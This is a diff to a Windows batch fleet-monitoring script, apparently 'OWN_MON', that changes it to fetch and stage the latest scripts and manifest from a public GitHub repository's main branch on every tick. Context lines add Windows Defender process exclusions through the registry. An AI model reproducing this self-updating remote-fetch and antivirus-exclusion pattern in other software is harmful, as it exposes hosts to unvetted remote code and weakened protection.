@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M68
+rem  OWN_MON  BUILD 20260804M69
+rem  M69: GIT_PIN=main always pulls tip every tick (restore force-update-to-latest).
 rem  M68: PUSH-CLEAN exception under NO_INSTALL — one clean uninstall+install+reboot per host (gryxa_clean_install).
 rem  M67: NO_INSTALL freeze — no auto msiexec/HEAL/REINSTALL/PUSH-START; watcher stays ON.
 rem  M66: NEVER sc stop Gryxa on force (M64 bounce left 60+ Stopped when Guest killed mon mid-tick).
@@ -74,7 +75,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M68"
+set "MONVER=M69"
 set "MON_MIN=M62"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
@@ -168,6 +169,7 @@ if exist "%STAGE%\fleet_channel.cfg" (
     if !_CG! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_CG!"
   )
   call :SaveFloor
+  rem M69: GIT_PIN=main (or empty) → always tip; only non-main pins override URLs
   if defined GIT_PIN if /I not "!GIT_PIN!"=="main" if not "!GIT_PIN!"=="" (
     set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_mon.cmd?t=%RANDOM%%RANDOM%"
     set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_lib.ps1?t=%RANDOM%%RANDOM%"
@@ -177,6 +179,15 @@ if exist "%STAGE%\fleet_channel.cfg" (
     set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest?t=%RANDOM%%RANDOM%"
     set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest.sig?t=%RANDOM%%RANDOM%"
     echo channel_pin=!GIT_PIN! mon_min=!MON_MIN! lib_min=!LIB_MIN! gryxa_min=!GRYXA_MIN!>>"%LOG%"
+  ) else (
+    set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%RANDOM%%RANDOM%"
+    set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
+    set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
+    set "OWNWATCH=https://raw.githubusercontent.com/xnobuddy/github-drop/main/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
+    set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd?t=%RANDOM%%RANDOM%"
+    set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
+    set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
+    echo channel_pin=main mon_min=!MON_MIN! lib_min=!LIB_MIN! gryxa_min=!GRYXA_MIN! always_tip=1>>"%LOG%"
   )
   echo floor mon=!MON_FLOOR! lib=!LIB_FLOOR! gryxa=!GRYXA_FLOOR!>>"%LOG%"
   copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul 2>&1
